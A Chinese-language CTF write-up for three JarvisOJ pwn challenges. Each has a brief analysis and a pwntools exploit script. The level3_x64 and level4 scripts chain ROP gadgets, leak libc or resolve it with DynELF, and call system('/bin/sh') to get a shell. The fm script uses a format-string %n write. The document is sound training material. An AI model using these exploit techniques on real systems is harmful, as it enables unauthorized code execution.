# write up 0713

## [XMANlevel3_x64

### 分析：

和level3一样，用rdi和rsi传递参数即可

### exp:

```python
from pwn import *

#context.log_level = 'debug'

#n = process('./level3_x64')
n = remote('pwn2.jarvisoj.com', 9883)
#n = remote("localhost",12345)

elf = ELF('./level3_x64')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so')

offset = 0x88

read_got = elf.got['read']
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vulnerable_function']

pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_pop_r15_ret_addr = 0x00000000004006b1

payload1 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_pop_r15_ret_addr) +  p64(read_got) + p64(1) + p64(write_plt) + p64(vuln_addr)

n.recvuntil("Input:\n")
n.sendline(payload1)

read_addr = u64(n.recv(8))

libcbase = read_addr - libc.symbols['read']

sys_addr = libcbase + libc.symbols['system']
sh_addr = libcbase + libc.search("/bin/sh").next()

n.recvuntil('Input:\n')
payload2 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(sys_addr)
n.sendline(payload2)
n.interactive()
```



## [XMAN]level4

### 分析：

本题无libc地址，要用DynELF获取system函数地址  

然后将在bss段写入'/bin/sh'进行get shell

https://www.anquanke.com/post/id/85129

### exp:

```python
from pwn import *

n = process('./level4')
n = remote('pwn2.jarvisoj.com',9880)
elf = ELF('./level4')

pop3addr = 0x08048509
offset = 0x88 + 4
main_addr = elf.symbols['main']
write_addr = elf.symbols['write']
read_addr = elf.symbols['read']
bss_addr = 0x0804A024

def leak(address):
	payload = 'a' * offset
	payload += p32(write_addr)
	payload	+= p32(pop3addr)
	payload += p32(1)
	payload += p32(address)
	payload += p32(4)
	payload += p32(main_addr)
	n.sendline(payload)
	data = n.recv(4)
	return data
d = DynELF(leak, elf=ELF("./level4"))
sys_addr = d.lookup('system', 'libc')

sh = '/bin/sh\x00'

payload = 'a' * offset
payload += p32(read_addr)
payload += p32(pop3addr)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(len(sh))
payload += p32(sys_addr)
payload += p32(1)
payload += p32(bss_addr)

n.send(payload)
n.send(sh)
n.interactive()

```



## fm

### 分析：

格式化字符串漏洞

### exp:

```python
from pwn import *

n = process('./fm')
#n = remote('pwn2.jarvisoj.com',9895)

x_addr = 0x0804A02C
payload = p32(x_addr) + '%11$n'
n.sendline(payload)
n.interactive()
```

